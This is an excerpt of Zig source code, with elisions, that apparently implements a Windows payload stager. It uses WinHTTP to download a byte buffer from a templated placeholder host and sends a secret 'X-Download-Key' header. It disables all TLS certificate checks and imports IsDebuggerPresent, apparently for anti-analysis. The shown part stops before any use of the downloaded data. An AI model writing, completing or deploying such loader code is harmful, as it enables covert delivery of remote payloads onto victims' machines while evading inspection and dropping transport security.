...
extern "winhttp" fn WinHttpSetOption(hInternet: HINTERNET, dwOption: DWORD, lpBuffer: *anyopaque, dwBufferLength: DWORD) callconv(WINAPI) BOOL;
extern "winhttp" fn WinHttpAddRequestHeaders(hRequest: HINTERNET, lpszHeaders: [*:0]const u16, dwHeadersLength: DWORD, dwModifiers: DWORD) callconv(WINAPI) BOOL;

const WINHTTP_ADDREQ_FLAG_ADD: DWORD = 0x20000000;

const HOST: [:0]const u16 = &[_:0]u16{HOST_PLACEHOLDER};
const DOWNLOAD_KEY: [:0]const u16 = &[_:0]u16{ 'X', '-', 'D', 'o', 'w', 'n', 'l', 'o', 'a', 'd', '-', 'K', 'e', 'y', ':', ' ', 'D', 'O', 'W', 'N', 'L', 'O', 'A', 'D', '_', 'K', 'E', 'Y', '_', 'P', 'L', 'A', 'C', 'E', 'H', 'O', 'L', 'D', 'E', 'R', '\r', '\n' };
...
fn download(host: [*:0]const u16, port: USHORT, path: [*:0]const u16) ?struct { buf: [*]u8, size: DWORD } {
    ...
    const flags: DWORD = if (USE_TLS) WINHTTP_FLAG_SECURE else 0;

    const hRequest = WinHttpOpenRequest(hConnect, verb, path, null, null, null, flags) orelse return null;
    defer _ = WinHttpCloseHandle(hRequest);
    if (USE_TLS) {
        var secFlags: DWORD = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
        _ = WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, @ptrCast(&secFlags), @sizeOf(DWORD));
    }

    if (WinHttpAddRequestHeaders(hRequest, DOWNLOAD_KEY.ptr, @bitCast(@as(i32, -1)), WINHTTP_ADDREQ_FLAG_ADD) == 0) return null;
...
extern "kernel32" fn IsDebuggerPresent() callconv(WINAPI) BOOL;
